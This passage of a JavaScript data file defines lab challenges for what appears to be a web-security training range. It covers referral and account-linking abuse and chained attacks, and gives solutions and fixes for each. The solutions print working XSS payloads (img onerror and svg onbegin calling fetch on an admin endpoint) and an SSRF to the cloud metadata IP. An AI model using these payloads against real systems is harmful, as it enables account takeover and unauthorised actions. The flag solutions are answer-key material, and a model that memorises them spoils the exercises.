          medium: ["A single request is capped at $200 now.", "Request the $200 refund three times in a row.", "FLAG appears."],
          hard: ["Repeating the main refund endpoint no longer works.", "Get a full refund via the main endpoint, then request a $150 refund via the separate partial-refund endpoint.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "invitation-abuse", category: "business-logic", title: "Referral / Invitation Abuse", shortTitle: "Invitation Abuse",
        tags: ["business-logic", "invitation-abuse", "invitation", "abuse"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Referral Program", blurb: "$25 credit per genuinely new friend referred — genuinely new, or just differently-typed?",
        inputContext: "JSON body (referred email)",
        goal: { explain: "Uniqueness checks on identifiers like email addresses need to account for how those identifiers can validly vary (case, plus-addressing) while still referring to the same real person — otherwise 'one reward per person' becomes 'one reward per exact string.'",
          example: "victim@example.test and victim+1@example.test deliver to the same inbox in real life, but are different strings.",
          mission: ["Earn more referral credit than genuinely distinct signups should allow.", "The FLAG appears once your credit crosses $100."] },
        difficultyNotes: { easy: "No per-signup tracking at all — redeem repeatedly with the same email.", medium: "The exact email is now single-use — but plus-addressing variants aren't recognized as the same address.", hard: "Plus-addressing is normalized away now. A separate bulk corporate-invite endpoint has no per-email tracking at all." },
        why: "Uniqueness is enforced on the raw string rather than a normalized form of the identifier, or isn't enforced at all on a secondary code path meant for a different use case.",
        fix: "Normalize identifiers (case, plus-addressing) before checking uniqueness, applied consistently across every endpoint that can grant the reward — including bulk/admin tooling.",
        reportSummary: { easy: "No uniqueness tracking on redemptions at all.", medium: "Exact-string tracking is bypassed by plus-addressing.", hard: "Normalization closes that gap, but a bulk-invite endpoint for corporate domains has no tracking at all." },
        reportImpact: { easy: "Unlimited referral credit from one real signup.", medium: "Same impact via trivially-varied email addresses.", hard: "Same impact via an unrelated bulk-invite feature." },
        solutionSteps: {
          easy: ["Redeem with the same email repeatedly.", "FLAG appears."],
          medium: ["The exact email can't be reused now.", "Try victim+1@example.test, victim+2@example.test, etc.", "FLAG appears."],
          hard: ["Plus-addressing no longer works.", "Use the bulk corporate invite endpoint instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "account-linking-abuse", category: "business-logic", title: "Account Linking Abuse", shortTitle: "Account Linking",
        tags: ["business-logic", "account-linking-abuse", "account", "linking", "abuse"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp — Link a Payment Account", blurb: "Complete another user's in-progress account link using their token instead of your own.",
        inputContext: "JSON body (linking token)",
        goal: { explain: "A linking token proves that a specific request was issued to a specific person — if the server only checks that a token EXISTS and is valid, rather than that it belongs to the CALLER, anyone who obtains it (leaked or guessed) can complete someone else's link.",
          example: "A weak token might be brute-forceable outright; even a strong one is exploitable if the server never checks who it was issued to.",
          mission: ["Complete a link using a token that wasn't legitimately issued to your own session.", "The FLAG appears once you've linked the victim's account."] },
        difficultyNotes: { easy: "Tokens are small, sequential, and easily guessable.", medium: "Tokens are properly random now — but the server only checks that a token exists and is valid, not that it belongs to the calling session.", hard: "The main linking endpoint is now properly bound to the session that requested the token. A separate support-assisted linking endpoint skips that same binding check." },
        why: "Session/ownership binding is missing on the token check (any valid token works, from anyone), or missing entirely on a secondary support/admin code path.",
        fix: "Bind every issued token to the specific session/account it was issued to, and verify that binding — not just token existence/validity — on every endpoint that can consume it, including support tooling.",
        reportSummary: { easy: "Tokens are guessable outright — a small numeric range.", medium: "Tokens are unguessable, but any valid token completes a link for whoever submits it, regardless of who it was issued to.", hard: "The main endpoint is properly session-bound, but a support-override endpoint isn't." },
        reportImpact: { easy: "Full account-linking hijack via brute force.", medium: "Same impact via any leaked token (e.g. via a referrer header, shared link, or email preview in a real deployment).", hard: "Same impact via the overlooked support tool." },
        solutionSteps: {
          easy: ["Try small numeric token values in the range shown on the page.", "FLAG appears."],
          medium: ["The victim's real token is shown on the page for this exercise — submit it directly.", "FLAG appears."],
          hard: ["The main endpoint now rejects tokens that aren't yours.", "Check the linked support ticket for a leaked link, then use the support-override endpoint with that token.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ===================================================================
      // ATTACK CHAINS — new category added in Phase 3c (Section 16 of the
      // upgrade spec). Each lab combines 3-4 genuinely distinct techniques
      // in sequence, same idea as the Final Challenge, generalized with an
      // explicit prerequisites list per chain instead of "solve everything."
      // See routes/vulns-chains.js.
      // ===================================================================
      {
        id: "chain-support-takeover", category: "chains", title: "Support Portal Takeover", shortTitle: "Support Portal Takeover",
        tags: ["chains", "chain-support-takeover", "chain", "support", "takeover", "attack-chain"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Support Portal", blurb: "Info disclosure finds you a password. IDOR gets you someone else's confidential ticket.",
        inputContext: "Chained (file discovery → login → IDOR)",
        locked: true, prerequisites: ["source-map-leak", "weak-password", "idor"],
        goal: { explain: "A leaked backup/config file exposes a default credential that was never rotated. Log in with it, then use IDOR to read a ticket you were never meant to see.",
          example: "Find the leftover file, log in as support_temp, then request a ticket reference that isn't your own.",
          mission: ["Find the leaked credential.", "Log in.", "Read the confidential finance ticket via IDOR.", "The FLAG appears in that ticket."] },
        difficultyNotes: { easy: "The leaked backup file is linked directly on the page; ticket references are plain small integers.", medium: "The backup file requires guessing a common '.bak' naming convention; ticket references are offset by a fixed amount from a visible one.", hard: "The leak is a leftover .git-config file at the site root; ticket references are base64-encoded." },
        why: "Two independently 'minor' bugs — an info-disclosure leak and a missing ownership check — combine into a full confidential-data compromise.",
        fix: "Remove leftover deploy artifacts and rotate default credentials before launch; add an ownership check to every ticket-lookup endpoint regardless of role.",
        reportSummary: { easy: "A directly-linked backup file leaks default credentials; ticket IDOR requires no encoding at all.", medium: "The backup file requires guessing a predictable naming convention; ticket references use a fixed numeric offset.", hard: "The leak is a leftover VCS config file; ticket references are base64-encoded." },
        reportImpact: { easy: "Full compromise of confidential finance communications via a support-tier account.", medium: "Same impact, requiring a slightly less obvious discovery step.", hard: "Same impact — demonstrates that encoding a reference is not the same as authorizing access to it." },
        solutionSteps: {
          easy: ["Open the linked backup file — it contains support_temp's password.", "Log in.", "Request ticket reference 2.", "FLAG appears."],
          medium: ["Request /vuln/chain-support-takeover/backup/support-portal.js.bak directly.", "Log in with the leaked credential.", "Your own ticket ref is shown; the finance ticket is ref+2-4=... just add the same offset to id 2 instead of 1.", "FLAG appears."],
          hard: ["Request /vuln/chain-support-takeover/.git-config directly.", "Log in with the leaked credential.", "Base64-encode the number 2 and request that as the ticket ref.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "chain-internal-pivot", category: "chains", title: "Internal Network Pivot", shortTitle: "Internal Network Pivot",
        tags: ["chains", "chain-internal-pivot", "chain", "internal", "pivot", "attack-chain"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Chat — Link Preview", blurb: "SSRF into an internal-only service, then use what it leaks against a real admin API.",
        inputContext: "Chained (SSRF → leaked key → admin API)",
        locked: true, prerequisites: ["ssrf", "exposed-dev-endpoint"],
        goal: { explain: "A link-preview feature will fetch whatever URL you give it. Internal-only services often skip authentication entirely, trusting that only internal callers can reach them — SSRF breaks that assumption.",
          example: "Get the preview bot to fetch an internal admin service instead of a public URL, then use what it hands back.",
          mission: ["Reach the internal admin service via SSRF.", "Use the API key it leaks against the real admin endpoint.", "The FLAG appears once access is granted."] },
        difficultyNotes: { easy: "The internal hostname works directly.", medium: "The literal internal hostname is now blocked — try a well-known internal/metadata IP address instead.", hard: "Direct internal addresses are blocked entirely — only a request routed through the 'trusted' internal redirector still reaches it." },
        why: "The preview feature accepts any URL with no allowlist, and the internal service it can reach has no authentication of its own, trusting network position alone.",
        fix: "Allowlist outbound destinations for any server-side URL fetch, and require real authentication on internal services regardless of where the request appears to originate from.",
        reportSummary: { easy: "The internal hostname is reachable directly, with no filtering at all.", medium: "The literal hostname is blocked, but well-known internal/metadata IPs aren't.", hard: "Direct addresses are blocked, but a trusted internal redirector's destination is never re-validated." },
        reportImpact: { easy: "Full SSRF pivot to an internal service, leaking credentials usable against a real admin API.", medium: "Same impact via a well-known internal address.", hard: "Same impact via an internal redirector that shouldn't be trusted blindly." },
        solutionSteps: {
          easy: ["Preview: http://internal-admin.local/creds", "Use the leaked key against the admin API.", "FLAG appears."],
          medium: ["The hostname above is blocked now.", "Preview: http://169.254.169.254/latest/meta-data/", "Use the leaked key. FLAG appears."],
          hard: ["Direct internal addresses are blocked.", "Preview: https://safe-redirector.securecorp-demo.test/go?to=internal-admin.local", "Use the leaked key. FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "chain-xss-to-admin-action", category: "chains", title: "Stored XSS to Admin Wire Approval", shortTitle: "XSS to Admin Action",
        tags: ["chains", "chain-xss-to-admin-action", "chain", "xss", "to", "admin", "action", "attack-chain"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Support — New Ticket", blurb: "A stored payload runs in an admin's session when they review the queue — and takes a real, sensitive action.",
        inputContext: "Chained (stored XSS → admin interaction → sensitive action)",
        locked: true, prerequisites: ["xss", "csrf"],
        goal: { explain: "Stored XSS is dangerous specifically because of WHO views the stored content — a payload an admin's browser executes runs with the admin's full privileges, not yours.",
          example: "Submit a ticket with a payload, get an admin to 'review' it (simulated), and have that hijacked session approve a pending wire transfer.",
          mission: ["Get a script to survive into the ticket queue.", "Trigger the simulated admin review.", "Approve the pending transfer through the hijacked session.", "The FLAG appears once approved."] },
        difficultyNotes: { easy: "No sanitization at all.", medium: "'<script' is stripped — use an event-handler payload instead.", hard: "'<script', onerror=, and onload= are all stripped — use a different, unblocked event handler." },
        why: "User-controlled content is stored and rendered for a HIGHER-PRIVILEGE user without adequate output encoding, and that user's session can take real, sensitive actions.",
        fix: "Encode all stored content for its render context regardless of who will view it, and require re-authentication (or at least a fresh, explicit confirmation) for high-value actions like wire transfer approval.",
        reportSummary: { easy: "The ticket message renders completely unescaped.", medium: "Script tags are blocked, but event-handler-based payloads aren't.", hard: "The common event handlers are blocked too, but less-common ones (e.g. SVG's onbegin) aren't." },
        reportImpact: { easy: "Full session hijack of any admin who reviews the queue, including sensitive financial actions.", medium: "Same impact via a slightly less obvious payload shape.", hard: "Same impact via an even less commonly-filtered event handler." },
        solutionSteps: {
          easy: ["Submit: <img src=x onerror=\"fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=easy',{method:'POST'})\">", "Simulate the admin review.", "The approve call fires automatically. FLAG appears."],
          medium: ["<script> is blocked. Use the same <img onerror=...> payload as easy — it's not a <script> tag.", "Simulate admin review.", "FLAG appears."],
          hard: ["onerror/onload are blocked now.", "Submit: <svg onbegin=\"fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=hard',{method:'POST'})\">", "Simulate admin review. FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      }
    ]
  };

  if (typeof module !== "undefined" && module.exports) module.exports = LABS_DATA;
  if (typeof window !== "undefined") window.LABS_DATA = LABS_DATA;
})();
